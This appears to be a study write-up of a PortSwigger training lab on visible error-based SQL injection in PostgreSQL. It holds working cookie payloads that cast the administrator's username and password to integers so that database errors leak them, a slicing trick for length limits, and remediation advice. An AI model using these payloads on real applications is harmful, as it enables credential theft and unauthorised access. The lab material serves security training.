# Lab 13 — Visible error-based SQL injection

| | |
|---|---|
| **Difficulty** | 🟨 Practitioner |
| **Category** | Error-based SQLi |
| **Concept** | [10 — Error-based SQL injection](https://portswigger.net/web-security/sql-injection) |
| **PortSwigger** | https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based |

---

## 🎯 Objective
The `TrackingId` cookie is injectable and the application **leaks verbose database errors**. Coerce the `administrator` password *into* an error message, then **log in**. Engine: **PostgreSQL**.

## 🧠 Background
If the DBMS echoes error text to the client, force a **type-conversion error** on a `SELECT` of the data you want — the failed cast prints the offending string (your data) verbatim.

## 🪜 Methodology
1. **Trigger an error** to confirm and fingerprint:
   ```sql
   TrackingId=xyz'          → verbose error (unterminated string / PostgreSQL)
   ```
2. **Leak the username** by casting a text value to `int`:
   ```sql
   TrackingId=xyz' AND CAST((SELECT username FROM users LIMIT 1) AS int)=1--
   ```
   Error: `invalid input syntax for type integer: "administrator"` → username leaked.
3. **Leak the password**:
   ```sql
   TrackingId=xyz' AND CAST((SELECT password FROM users LIMIT 1) AS int)=1--
   ```
   Error: `invalid input syntax for type integer: "s3cr3tp4ss…"` → password leaked in full (single request).
4. Log in as `administrator`.

## 💥 Payload
```
Cookie: TrackingId=xyz' AND CAST((SELECT password FROM users WHERE username='administrator') AS int)=1--
```

> 💡 If the injected string is length-limited by the app, extract in slices with `SUBSTRING((SELECT password …),1,32)`, then `,33,32)`, etc.

## ✅ Why it works
PostgreSQL cannot cast `"administrator"`/the password to `int`, so it raises an error that **includes the value being converted**. Because the app surfaces that error, the secret is delivered directly — far faster than bit-by-bit blind extraction.

## 🛡️ Remediation
- **Suppress detailed DB errors** in production (generic 500 page).
- Parameterize the query.
- See [16 — Prevention](https://portswigger.net/web-security/sql-injection).

## 🔑 Takeaway
Verbose errors turn "blind" into "visible" — one cast can dump a whole value. `#sqli` `#practitioner` `#error-based` `#postgresql`
